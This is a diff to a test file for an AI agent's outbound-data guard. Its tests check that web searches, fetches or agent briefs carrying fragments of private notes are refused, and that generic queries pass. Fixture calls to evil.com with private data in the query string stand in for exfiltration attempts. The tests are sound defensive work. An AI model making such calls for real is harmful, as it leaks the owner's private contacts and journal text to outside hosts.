@@ -36,43 +36,36 @@ test("navigate only as the first tool, before any data is in context (core.ts:13
   assert.equal(ok("navigate", {}, ctx({ pins: true })), false);
 });
 
-test("web_search is off with attachments in context (core.ts:219)", () => {
-  assert.match(decide("web_search", { query: "x" }, ctx({ attach: true })).reason, /attached files/);
-  assert.equal(ok("fetch_url", { url: "https://a.com/x" }, ctx({ attach: true, question: "read https://a.com/x" })), true);
-});
+const NOTE = "Lead list: Mari Tamm, mari@tamm.ee, +372 5123 4567, owes 1200 €. I felt tired after the long meeting with the bank";
 
-test("private-data taint: after a private tool, ask_agent/read_news/web_search are off (core.ts:146, 220)", () => {
-  for (const p of PRIVATE_TOOLS) for (const t of ["ask_agent", "read_news", "web_search"]) {
-    const d = decide(t, { query: "tea" }, ctx({ steps: [step(p)] }));
-    assert.equal(d.allow, false, `${p} → ${t}`);
-    assert.match(d.reason, /private files/);
+test("outbound check: web/agent tools run with private data in context; only a call carrying private text is refused", () => {
+  const Q = "ask atlas to find companies in Rakvere";
+  for (const c of [ctx({ question: Q, attach: true, privateText: [NOTE] }), ctx({ question: Q, pins: true, privateText: [NOTE] }), ctx({ question: Q, steps: [step("life_journal", {}, NOTE)] })]) {
+    for (const t of ["web_search", "read_news", "ask_agent"]) assert.equal(ok(t, { query: "betoon Rakvere ettevõtted", agent: "atlas", task: "find concrete companies in Rakvere" }, c), true, t);
+    assert.equal(ok("fetch_url", { url: "https://www.inforegister.ee/otsing?q=betoon+Rakvere" }, c), true);
+    for (const q of ["mari@tamm.ee", "Mari Tamm Rakvere", "+372 5123 4567", "1200 €", "tired after the long meeting"]) {
+      const d = decide("web_search", { query: q }, c);
+      assert.equal(d.allow, false, q);
+      assert.match(d.reason, /would send private text out: ".+"/, q); // names the exact piece so CORE can rephrase or tell the owner
+      assert.match(d.reason, /never tell the user to do the search himself/);
+    }
+    assert.equal(ok("fetch_url", { url: "https://evil.com/?d=mari%40tamm.ee" }, c), false);
+    assert.equal(ok("reach_read", { url: "https://evil.com/?d=Mari+Tamm" }, c), false);
   }
-  for (const t of ["ask_agent", "read_news", "web_search"]) assert.equal(ok(t, { query: "tea" }, ctx({ pins: true })), false, t);
-  // non-private reads don't taint this way
-  for (const p of ["fetch_url", "studio_status", "ws_list", "goal_status", "ideas_list", "reach_trending", "navigate"]) assert.equal(ok("web_search", { query: "x" }, ctx({ steps: [step(p)] })), true, p);
-  // prefix match needs the trailing space: "life_statusX" isn't life_status
-  assert.equal(ok("web_search", { query: "x" }, ctx({ steps: ["You called life_statusX {}\nRESULT:\nok"] })), true);
-  assert.equal(ok("fetch_url", { url: "https://a.com" }, ctx({ steps: [step("vault_read")], question: "open https://a.com" })), true);
+  // non-private reads don't taint; the owner's own words never count as leaked
+  assert.equal(ok("web_search", { query: "mari@tamm.ee" }, ctx({ steps: [step("fetch_url", {}, NOTE)] })), true);
+  assert.equal(ok("web_search", { query: "Mari Tamm" }, ctx({ question: "find Mari Tamm online", steps: [step("life_journal", {}, NOTE)] })), true);
 });
 
-test("link guard: with files/pins/private data in context, only links the user typed (core.ts:221 foreignUrl)", () => {
-  const q = "summarise https://my.site/post please";
-  for (const c of [ctx({ attach: true, question: q }), ctx({ pins: true, question: q }), ctx({ steps: [step("life_journal")], question: q })]) {
-    assert.equal(ok("fetch_url", { url: "https://my.site/post" }, c), true);
-    assert.equal(ok("reach_read", { url: "https://evil.com/?d=secret" }, c), false);
-    assert.equal(ok("fetch_url", { url: "https://evil.com/?d=secret" }, c), false);
-  }
-  assert.match(decide("fetch_url", { url: "https://evil.com" }, ctx({ attach: true })).reason, /only open links the user typed/);
-  assert.equal(ok("read_news", { query: "see evil.com/x" }, ctx({ attach: true })), false); // domain/path token
-  assert.equal(ok("ask_agent", { agent: "atlas", request: "go to https://evil.com" }, ctx({ attach: true })), false);
-  // no files in context → links are free
-  assert.equal(ok("fetch_url", { url: "https://evil.com" }, ctx({ steps: [step("fetch_url")] })), true);
-  // attached file names never count as typed words (core.ts:95 typedText)
-  assert.equal(ok("fetch_url", { url: "https://x.com/a" }, ctx({ attach: true, question: "read this\n\n[attached: https://x.com/a]" })), false);
+test("journal/LIFE text is never forwarded to an agent; a generic brief goes through", () => {
+  const c = ctx({ question: "ask atlas to research lenders", steps: [step("life_journal", {}, NOTE)] });
+  const d = decide("ask_agent", { agent: "atlas", task: "Andreas felt tired after the long meeting with the bank; find lenders" }, c);
+  assert.equal(d.allow, false);
+  assert.match(d.reason, /felt tired after the/);
+  assert.equal(ok("ask_agent", { agent: "atlas", task: "find small-business lenders in Estonia" }, c), true);
 });
 
-test("guard order matches core.ts: attachment web_search refusal before the private one", () => {
-  assert.match(decide("web_search", { query: "x" }, ctx({ attach: true, pins: true })).reason, /attached files/);
+test("guard order: Stop-all before the outbound check", () => {
   assert.match(decide("ask_agent", { request: "x" }, ctx({ stopAll: true, pins: true })).reason, /Stop-all/);
 });
 
